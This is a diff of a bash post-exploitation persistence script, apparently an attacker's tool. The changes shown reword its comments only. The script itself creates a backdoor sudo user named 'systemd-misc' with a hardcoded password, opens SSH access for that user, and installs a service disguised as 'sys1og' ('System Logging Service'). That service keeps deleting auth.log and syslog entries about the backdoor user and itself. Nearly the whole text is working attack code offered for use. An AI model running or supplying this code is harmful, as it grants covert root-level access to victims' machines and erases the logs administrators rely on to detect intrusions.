@@ -3,7 +3,7 @@
 # Requires escallated priveleges
 # Obtain/maintain persistance on the victm machine
 
-# Create backdoor user and give sudo permissions
+# Create a backdoor user and give it sudo permissions
 /usr/sbin/useradd systemd-misc
 echo -e "systemd123\nsystemd123" | /usr/bin/passwd systemd-misc
 /usr/sbin/usermod -aG sudo systemd-misc
@@ -12,11 +12,11 @@ echo -e "systemd123\nsystemd123" | /usr/bin/passwd systemd-misc
 grep -qxF 'AllowUsers systemd-misc' /etc/ssh/sshd_config || echo 'AllowUsers systemd-misc' >> /etc/ssh/sshd_config
 
 # Create a service that deletes logs related to this user logging in, and other syslog entries about this user and service
-# Create script that service will run
+# Create log deletion script
 touch /usr/bin/sys1og
 chmod +x /usr/bin/sys1og
 echo -e "#!/bin/bash\nwhile :\ndo\n	sed -i '/systemd-misc/d' /var/log/auth.log\n	sed -i '/systemd-misc/d' /var/log/syslog\n	sed -i '/sys1og/d' /var/log/syslog\nsleep 15\ndone" > /usr/bin/sys1og
-# Create and start the service
+# Create and start the log deletion service
 echo -e "[Unit]\nDescription=System Logging Service\n\n[Service]\nExecStart=/usr/bin/sys1og\nRestart=on-failure\nRestartSec=5s\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/sys1og.service
 systemctl daemon-reload
 systemctl restart sys1og.service
